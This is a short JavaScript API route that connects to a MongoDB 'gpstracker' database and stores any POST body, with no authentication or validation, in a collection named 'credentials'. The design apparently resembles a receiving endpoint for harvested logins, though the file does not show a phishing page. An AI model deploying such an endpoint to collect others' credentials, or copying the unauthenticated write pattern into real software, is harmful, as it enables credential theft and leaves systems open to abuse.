import { MongoClient } from "mongodb";

let cachedClient = null;
let cachedDb = null;

async function connectToDatabase() {
  if (cachedDb) return { client: cachedClient, db: cachedDb };

  if (!process.env.MONGODB_URI) {
    throw new Error("Please define MONGODB_URI in your environment variables");
  }

  const client = new MongoClient(process.env.MONGODB_URI);
  await client.connect();

  const db = client.db("gpstracker"); // change if needed

  cachedClient = client;
  cachedDb = db;

  return { client, db };
}

export default async function handler(req, res) {
  if (req.method !== "POST") {
    res.setHeader("Allow", ["POST"]);
    return res.status(405).json({ success: false, message: `Method ${req.method} Not Allowed` });
  }

  try {
    if (!req.body || Object.keys(req.body).length === 0) {
      return res.status(400).json({ success: false, message: "No data provided" });
    }

    const { db } = await connectToDatabase();
    const credentialsCollection = db.collection("credentials");

    const result = await credentialsCollection.insertOne(req.body);

    return res.status(200).json({
      success: true,
      message: "Data received and stored successfully.",
      insertedId: result.insertedId,
    });
  } catch (error) {
    console.error("MongoDB insert error:", error);
    return res.status(500).json({
      success: false,
      message: "Failed to store data.",
    });
  }
}
